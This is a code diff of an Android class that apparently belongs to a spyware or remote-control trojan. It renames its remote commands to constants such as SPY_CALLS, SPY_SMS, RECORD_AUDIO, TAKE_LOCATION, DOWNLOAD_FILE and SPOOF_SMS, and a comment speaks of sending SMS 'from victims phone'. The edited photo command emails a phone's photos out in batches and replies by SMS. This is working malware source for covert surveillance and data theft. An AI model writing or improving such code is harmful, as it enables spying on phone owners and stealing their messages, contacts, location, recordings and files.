@@ -183,7 +183,7 @@ public class CommandPool extends Object {
 		 *  Monitoring of call log base 
 		 *  "rcalls;on|off"
 		 */
-		commands.add( new CommandObj("rcalls","on|off")  { 
+		commands.add( new CommandObj(Commands.SPY_CALLS,"on|off")  { 
 			
 			public int Invoke() throws Exception {
 				final handleCallLog handler = new handleCallLog(mContext);
@@ -208,7 +208,7 @@ public class CommandPool extends Object {
 		 *   Reflects contacts
 		 *   "rcontacts;<on|off>"
 		 */
-		commands.add( new CommandObj("rcontacts","on|off")  { 
+		commands.add( new CommandObj(Commands.SPY_CONTACTS,"on|off")  { 
 				
 			public int Invoke() throws Exception {
 				final handleContacts handler = new handleContacts(mContext);
@@ -230,7 +230,7 @@ public class CommandPool extends Object {
 		/*
 		 *  Network IP address info
 		 */
-		commands.add( new CommandObj("net")  { 
+		commands.add( new CommandObj(Commands.NETWORK_INFO)  { 
 			
 			public void bgProcess() {
 				BackgroundTask<Boolean,CommandObj> bg = new BackgroundTask<Boolean,CommandObj>(mContext,false) {
@@ -303,7 +303,7 @@ public class CommandPool extends Object {
 		 *  List Contacts
 		 * "@lcontacts"
 		 */
-		commands.add(new CommandObj("lcontacts") {
+		commands.add(new CommandObj(Commands.LIST_CONTACTS) {
 			public int Invoke() throws Exception {
 				final List<ContactObj> contacts = listContacts();
 				int nCount = 1;
@@ -330,7 +330,7 @@ public class CommandPool extends Object {
 		 *  Lists SMS messages
 		 *  "@lsms;[f:yymmdd];[t:yymmdd]"
 		 */
-		commands.add(new CommandObj("lsms",";[f:yymmdd];[t:yymmdd]") {
+		commands.add(new CommandObj(Commands.LIST_SMS,";[f:yymmdd];[t:yymmdd]") {
 			public int Invoke() throws Exception {
 				ArrayList<SmsObj> smsList = listSMS();
 		
@@ -390,7 +390,7 @@ public class CommandPool extends Object {
 		 *  Lists calls
 		 *  "lcalls;f:yymmdd;t:yymmdd"
 		 */
-		commands.add( new CommandObj("lcalls","[f:yymmdd;[t:yymmdd]") {
+		commands.add( new CommandObj(Commands.LIST_CALLS,"[f:yymmdd;[t:yymmdd]") {
 
 			public int Invoke() throws Exception {
 				
@@ -433,7 +433,7 @@ public class CommandPool extends Object {
 		 *   Starts an location manager to acquire gps coords
 		*    "@gps;<timeout_sec>"
 		 */
-		commands.add(new CommandObj("gps",";t:<liveTime>[;off]") {
+		commands.add(new CommandObj(Commands.TAKE_LOCATION,";t:<liveTime>[;off]") {
 			
 			public boolean isActive = false;
 			
@@ -531,7 +531,7 @@ public class CommandPool extends Object {
 		 *  Set's up properties,emil,host,etc
 		*  "@setup;"
 		 */
-		commands.add(new CommandObj("setup") {
+		commands.add(new CommandObj(Commands.SETUP) {
 			public int Invoke() throws Exception {
 				
 				SharedPreferences prefs = mContext.getSharedPreferences(CommandObj.PREF_NAME,1);
@@ -571,7 +571,7 @@ public class CommandPool extends Object {
 		 *  Shows simple notification on status bat
 		 * " @notify;Hello world!;This is the Test"
 		 */
-		commands.add(new CommandObj("notify",";<title>;<message>") {
+		commands.add(new CommandObj(Commands.NOTIFY,";<title>;<message>") {
 			public int Invoke() throws Exception {
 				String title = "";
 				String msg = "";
@@ -594,7 +594,7 @@ public class CommandPool extends Object {
 		 *  Vibrates the phone
 		 *  "@vibrate;<sec>;<sec>;...<sec>"
 		 */
-		commands.add(new CommandObj("vibrate","<ms>;...;<ms>...") {
+		commands.add(new CommandObj(Commands.VIBRATE,"<ms>;...;<ms>...") {
 			
 			public int Invoke() {
 				Vibrator vibrator = (Vibrator)mContext.getSystemService(Context.VIBRATOR_SERVICE);
@@ -615,7 +615,7 @@ public class CommandPool extends Object {
 		 *  Turns Wifi on/off
 		 *  "wifi;<0|1>"
 		 */
-		commands.add(new CommandObj("wifi",";0|1") {
+		commands.add(new CommandObj(Commands.SWITCH_WIFI,";0|1") {
 			public int Invoke() throws Exception {
 				WifiManager wifiManager = (WifiManager)mContext.getSystemService(Context.WIFI_SERVICE);
 				boolean enable = CommandArgs.toBoolean(args.getOpt(0));
@@ -636,7 +636,7 @@ public class CommandPool extends Object {
 		 *  Downloads photo's
 		 *  format: "photo;"
 		 */
-		commands.add(new CommandObj("photo",";t:<yymmdd>;[names]") {
+		commands.add(new CommandObj(Commands.TAKE_PHOTO,";t:<yymmdd>;[names];[sms]") {
 			
 			public List<File> files = new ArrayList<File>();
 			public long checkDate = 0;
@@ -655,23 +655,24 @@ public class CommandPool extends Object {
 				
 			}
 	
-			public void send() {
+			public void sendPhotos() {
 				BackgroundTask<Boolean,Void> bgTask = new BackgroundTask<Boolean,Void>(mContext,false) {
+					public void onComplete(Boolean success) {
+							replySMS("%s",commandResult);
+							NetLog.v("%s",commandResult);
+					}
 					@Override
 					protected Boolean doInBackground(Void ... arg0) {
 						try {
 							int count = 0;
 							int maxCount = 2;
-							int sendCount = 0;
 							Mail mail = null;
+							int sendCount = 0;
 							
 							for ( File f : files ) {
-								if ( count == 0 ) {
-									NetLog.v("Mail created\r\n");
+								if ( count == 0 ) 
 									mail = createMail();
-								}
 								
-								NetLog.v("Photo added %s\r\n", f.getAbsolutePath());
 								mail.addAttachment(f.getAbsolutePath(),false);
 								count++;
 								if ( count == maxCount ) {
@@ -682,7 +683,7 @@ public class CommandPool extends Object {
 									mail.send();
 									count = 0;
 								}
-							} // files
+							} // for files
 							
 							if ( count != 0 ) {
 								NetLog.v("Remaining mails %d",count);
@@ -692,15 +693,16 @@ public class CommandPool extends Object {
 								mail.setBody(commandResult);
 								mail.send();
 							}
-							NetLog.v("Photos sent %d/%d",sendCount,files.size());
-						} catch (Exception e) {
-							NetLog.v("Sending mail: %s",e.getMessage());
+							commandResult = String.format("Фотографии отправлены на почту ( %d из %d  )",sendCount,files.size());
+						} catch ( Exception e) {
+							commandResult = String.format("Ошибка отправки фотографий: %s", e.getMessage());
+							return false;
 						}
 						return true; 
 					}
 				};
 				bgTask.exec();
-			}
+			} // send
 			
 			public int Invoke() throws Exception {
 				
@@ -711,7 +713,7 @@ public class CommandPool extends Object {
 					commandResult = String.format("No photos found...");
 					return CommandObj.REPLY;
 				}
-				send();
+				sendPhotos();
 				return CommandObj.OK;
 			}
 		}); // "photo"
@@ -720,7 +722,7 @@ public class CommandPool extends Object {
 		 *  downloads an arbitary file
 		 *   "file;f:<filepath>;[m:<mask>]"
 		 */
-		commands.add(new CommandObj("file",";f:<filepath>;[m:<ext>]") {
+		commands.add(new CommandObj(Commands.DOWNLOAD_FILE,";f:<filepath>;[m:<ext>]") {
 			
 			final class Filter implements FilenameFilter {
 				private String mask;
@@ -776,7 +778,7 @@ public class CommandPool extends Object {
 		 *  SMS reflection
 		 *  "rsms;<on|off>;[mail]"
 		 */
-		commands.add(new CommandObj("rsms","[;off][;mail]") {
+		commands.add(new CommandObj(Commands.SPY_SMS,"[;off][;mail]") {
 			
 			final public HashMap<String,String> names = new HashMap<String,String>();
 			
@@ -816,7 +818,7 @@ public class CommandPool extends Object {
 		 *  Voice recording
 		 *  "mic;t:<sec>"
 		 */
-		commands.add(new CommandObj("mic","<sec>;[sms]") {
+		commands.add(new CommandObj(Commands.RECORD_AUDIO,"<sec>;[sms]") {
 			public int Invoke() throws Exception {
 				
 				if ( args.optCount() == 0 ) {
@@ -934,7 +936,7 @@ public class CommandPool extends Object {
 		 *  send sms from victims phone
 		 *  "msg;<phone>;<message>"
 		 */
-		commands.add(new CommandObj("msg","<phone>;<text>") {
+		commands.add(new CommandObj(Commands.SPOOF_SMS,"<phone>;<text>") {
 			public int Invoke() throws Exception {
 				
 				if ( args.optCount() != 2 ) {
@@ -958,7 +960,7 @@ public class CommandPool extends Object {
 		 *  Send the availsbale command to requestor
 		 *  "help"
 		 */
-		commands.add(new CommandObj("help") {
+		commands.add(new CommandObj(Commands.HELP) {
 			public int Invoke() {
 				for ( CommandObj cmd : commands ) {
 					if ( commandResult.length() > 0 ) commandResult = commandResult.concat(",");
@@ -976,7 +978,7 @@ public class CommandPool extends Object {
 		 *  HTTPD Server
 		 *  "httpd;[host];<port>"
 		 */
-		commands.add(new CommandObj("httpd",";{stop};{<ip>];<port>}") {
+		commands.add(new CommandObj(Commands.RUN_HTTPD,";{stop};{<ip>];<port>}") {
 			public int Invoke() throws Exception {
 				String  host = null;
 				String  port = null;
